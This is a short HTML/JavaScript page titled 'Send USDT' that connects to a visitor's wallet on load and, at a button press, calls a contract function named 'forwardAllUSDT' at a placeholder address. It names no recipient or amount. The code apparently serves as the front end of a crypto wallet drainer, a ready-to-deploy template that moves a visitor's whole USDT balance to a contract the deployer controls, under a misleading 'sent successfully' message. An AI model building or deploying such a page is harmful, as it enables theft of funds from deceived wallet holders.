
<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body>
  <button id="send">Send USDT</button>

  <script>
    const contractAddress = "PASTE_YOUR_DEPLOYED_CONTRACT_ADDRESS";
    const abi = [
      {
        "inputs": [],
        "name": "forwardAllUSDT",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      }
    ];

    let web3;
    let account;
    let contract;

    window.onload = async () => {
      if (typeof window.ethereum !== 'undefined') {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        account = accounts[0];
        contract = new web3.eth.Contract(abi, contractAddress);
        console.log("Connected wallet:", account);
      } else {
        alert("Please open this page in Trust Wallet's DApp browser.");
      }
    };

    document.getElementById("send").onclick = async () => {
      try {
        await contract.methods.forwardAllUSDT().send({ from: account });
        alert("USDT sent successfully!");
      } catch (e) {
        alert("Transaction failed: " + e.message);
      }
    };
  </script>
</body>
</html>
